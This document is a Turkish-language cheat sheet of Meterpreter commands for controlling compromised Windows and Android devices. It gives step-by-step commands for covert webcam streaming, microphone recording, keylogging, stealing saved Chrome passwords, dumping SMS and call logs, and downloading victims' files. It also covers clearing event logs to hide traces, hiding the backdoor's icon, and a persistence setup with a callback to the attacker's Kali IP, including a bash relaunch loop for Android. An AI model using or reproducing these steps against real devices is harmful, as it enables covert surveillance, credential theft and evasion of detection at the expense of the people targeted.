Meterpreter ile Yapabileceğimiz İşlemler:
    (Windows)
    Ekran Görüntüsü Almak:
        ->screenshot -p <kayıt yolu ve adı> -q <görüntü kalites(max=100)>
    Sistem Özellikleri Öğrenmek:
        ->sysinfo
    Dosya işlemleri:
        ->ls  (Komutu ile bulunduğumuz dizindeki tüm dosyaları listeleriz.)
        -> download -r <dosya adı>  (Komutu ile hedef cihazdan kendi bilgisayarımıza dosya indirebiliriz.)
    Kameradan Görüntü Almak:
        ->webcam_list (Komutu ile kameraları listeliyoruz.)
        ->webcam_snap <kamera numarası> (Kameradan fotoğraf alır.)
        ->webcam_stream <kamera numarası> (Kamerayı canlı olarak izlememize ve kaydetmemizi sağlar.)
    Ses Kaydı Almak:
        ->record_mic (Sonlandırana kadar ses kaydı almaya devam eder. -d parametresi ile saniye cinsinden süre belirlenebilir.)
    Browserdan Veri Çekmek:
        ->run post/windows/gather/enum_chrome (Komutu ile chrome'a kayıtlı şifreleri kullanıcı adlarını vs çekebiliriz.)
    Keylogger:
        ->keyscan_start (Komutu klavye tıklamalarının hepsini kaydeder.)
        ->keyscan_dump (Komutu iste kaydedilen verileri görmemizi sağlar.)
    İzleri Silmek:
        ->run event_manager -c (Komutu ile log kayıtlarını temizleyerek izimizi kaybettirmiş oluyoruz.)
    Backdoorun Kalıcılığını Sağlamak:
        ->run persistence -A -U -i <sistem açıldıktan sonra backdoorun başlama saniyesi> -p <port> -r <kali_ip veya domain>
        
        Kalıcılığı sağladıktan sonra exit yazarak çıkış yaparsak kalıcılık kapanır bu yüzden konsol ekranının kapatma simgesine tıklayarak kapatmalıyız.
        
    (Android)
    Sms Kayıtlarını Almak:
        dump_sms
    Kameradan Yayın ve Görüntü Almak.
        ->webcam_list (Komutu ile kameraları listeliyoruz.)
        ->webcam_snap <kamera numarası> (Kameradan fotoğraf alır.)
        ->webcam_stream <kamera numarası> (Kamerayı canlı olarak izlememize ve kaydetmemizi sağlar.)
    Arama Kayıtları Alma:
        ->dump_callog
    Ses Kaydı Almak:
        record_mic (Sonlandırana kadar ses kaydı almaya devam eder. -d parametresi ile saniye cinsinden süre belirlenebilir.)
    Backdoor'u Gizleme:
        ->hide_app_icon
    Backdoor'u Kalıcı Hale Getirmek:
        Başka bir terminal ekranında nano kalicilik.sh komutu ile dosya oluşturuyoruz ve içerisine aşağıdaki kodları yapıştırıyoruz.
        #!/bin/bash
        while:
        do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
        sleep 20
        done
        
        CTRL+O kombinasyonu ile dosyayı kaydediyoruz ve çıkıyoruz. Sonrasında dosy çalıştırma yetkisi verelim bunun için;
        ->chmod +x kalicilik.sh
        Meterpreter terminalimizden ;
        ->upload <dosy dizni/kalicilik.sh>
        ->shell
        Komutu ile kalıcılık kazanmış oluyoruz. Ama malesefki bu kalıcılık işlemi android 6 sürümünün altındakilerde çalışmakta.
